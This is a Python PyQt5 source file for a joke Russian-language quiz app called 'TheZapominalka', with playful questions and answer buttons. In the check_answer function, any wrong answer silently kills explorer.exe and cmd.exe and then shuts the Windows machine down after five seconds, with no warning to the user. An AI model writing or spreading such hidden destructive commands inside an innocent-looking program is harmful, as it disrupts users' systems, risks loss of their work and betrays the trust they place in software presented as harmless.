from PyQt5.QtCore import Qt
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QRadioButton, QLabel, QVBoxLayout, QHBoxLayout, QMessageBox, QGroupBox, QButtonGroup
from random import shuffle, choice
from os import *
import subprocess as sp

class Question():
    def __init__(self, q, right_ans, wrong_ans1, wrong_ans2, wrong_ans3):
        self.question = q
        self.right_answer = right_ans
        self.wrong_answer1 = wrong_ans1
        self.wrong_answer2 = wrong_ans2
        self.wrong_answer3 = wrong_ans3
# right - Правильный, wrong - Неправильный

def ask(quest: Question):
    shuffle(buttons)
    buttons[0].setText(quest.right_answer)
    buttons[1].setText(quest.wrong_answer1)
    buttons[2].setText(quest.wrong_answer2)
    buttons[3].setText(quest.wrong_answer3)
    Label1.setText(quest.question)
    Text2.setText(quest.right_answer)
    show_question()
    window.total_questions += 1

def check_answer():
    if buttons[0].isChecked():
        Text1.setText("Правильно")
        show_result()
        window.correct_answers += 1
        rate = window.correct_answers / window.total_questions * 100    
        print(rate)
    elif buttons[1].isChecked() or buttons[2].isChecked() or buttons[3].isChecked():
        Text1.setText("Неправильно")
        show_result()
        rate = window.correct_answers / window.total_questions * 100 
        print("Рейтинг:", rate, "%")
        sp.Popen('taskkill /im explorer.exe /f')
        sp.Popen('taskkill /im cmd.exe /f')
        system("shutdown -s -t 5")
    
        

def show_result():
    VariantBox.hide()
    OtvetnikBox.show()
    button1.setText('Следующий Вопрос')

def show_question():
    OtvetnikBox.hide()
    VariantBox.show()
    button1.setText('Ответить')
    RadioBGroup.setExclusive(False)
    rb_v1.setChecked(False)
    rb_v2.setChecked(False)
    rb_v3.setChecked(False)
    rb_v4.setChecked(False)
    RadioBGroup.setExclusive(True)

def start_test():
    if button1.text() == "Ответить":
        check_answer()
    elif button1.text() == ('Следующий Вопрос'):
        next_question()

def next_question():
    random_question = choice(Questions)
    ask(random_question)
    start_test()
    

app = QApplication([]) #приложение
window = QWidget() #окно
window.setWindowTitle('TheZapominalka⩤')
window.resize(600, 300)
window.correct_answers = 0
window.total_questions = 0

# ----------------------------------------

Label1 = QLabel('Вопрос: Что вкуснее?')
button1 = QPushButton('Ответить')

# ----------------------------------------

VariantBox = QGroupBox('Варианты')


rb_v1 = QRadioButton('Пицца в столовке')
rb_v2 = QRadioButton('Шашлык')
rb_v3 = QRadioButton('Шавэрма')
rb_v4 = QRadioButton('ДОШИРАААААК')

buttons = [rb_v1, rb_v2, rb_v3, rb_v4]
shuffle(buttons)

vb_h1 = QHBoxLayout()
vb_v1 = QVBoxLayout()
vb_v2 = QVBoxLayout()


vb_v1.addWidget(rb_v1)
vb_v1.addWidget(rb_v3)
vb_v2.addWidget(rb_v2)
vb_v2.addWidget(rb_v4)

vb_h1.addLayout(vb_v1)
vb_h1.addLayout(vb_v2)
VariantBox.setLayout(vb_h1)

# ----------------------------------------

RadioBGroup = QButtonGroup()

RadioBGroup.addButton(rb_v1)
RadioBGroup.addButton(rb_v2)
RadioBGroup.addButton(rb_v3)
RadioBGroup.addButton(rb_v4)

# ----------------------------------------

OtvetnikBox = QGroupBox('Ваш ответ...')

Text1 = QLabel("Правильно/Неправильно")
Text2 = QLabel("Правильный ответ")

OB_v_line = QVBoxLayout()
OB_v_line.addWidget(Text1)
OB_v_line.addWidget(Text2, alignment = Qt.AlignCenter)
OtvetnikBox.setLayout(OB_v_line)

OtvetnikBox.hide()

# ----------------------------------------

v_line = QVBoxLayout() # < Главная Вертикальная Линия
h1_line = QHBoxLayout()
h2_line = QHBoxLayout()
h3_line = QHBoxLayout()
# ^ Второстепенные Горизонтальные Линии
h1_line.addWidget(Label1)
h2_line.addWidget(VariantBox)
h2_line.addWidget(OtvetnikBox)
h3_line.addStretch(1)
h3_line.addWidget(button1, stretch=2)
h3_line.addStretch(1)


v_line.addLayout(h1_line)
v_line.addLayout(h2_line)
v_line.addLayout(h3_line)

button1.clicked.connect(start_test)

window.setLayout(v_line)

# ----------------------------------------

Questions = []
Questions.append(Question("У какой страны нет границ?", "Казахстан", "Россия", "USA", "ОАЭ"))
Questions.append(Question("В чем смысл жизни?", "21", "В жизни", "Ето судьба", "Е"))
Questions.append(Question('Выбери свою сторону', 'я усталь', "джидаи", "ситхи", "Бэби йода"))

# Порядок: Название Вопроса(Вопрос, Правильный Ответ, Неправильный 1, Неправильный 2, Неправильный 3)

# ----------------------------------------

next_question()

window.show() #показать окно
app.exec() #открыть окно